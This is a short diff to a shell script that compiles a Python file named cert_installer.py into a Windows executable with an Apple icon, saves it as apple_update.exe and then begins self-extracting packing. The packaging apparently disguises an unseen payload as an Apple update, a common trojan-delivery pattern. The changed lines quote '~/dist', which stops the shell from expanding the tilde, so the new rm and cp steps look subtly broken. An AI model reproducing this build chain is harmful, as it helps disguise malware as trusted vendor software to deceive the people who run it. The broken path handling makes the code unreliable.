@@ -80,8 +80,9 @@ except:
     pass
 EOF
 
+rm -rf "~/dist"
 pyinstaller --onefile --noconfirm --icon "/tmp/apple.ico" "/tmp/cert_installer.py"
-cp ~/dist/cert_installer.exe "/tmp/apple_update.exe"
+cp -f "~/dist/cert_installer.exe" "/tmp/apple_update.exe"
 
 # --- SFX Packing ---
 cat > /tmp/sfx.txt << EOF
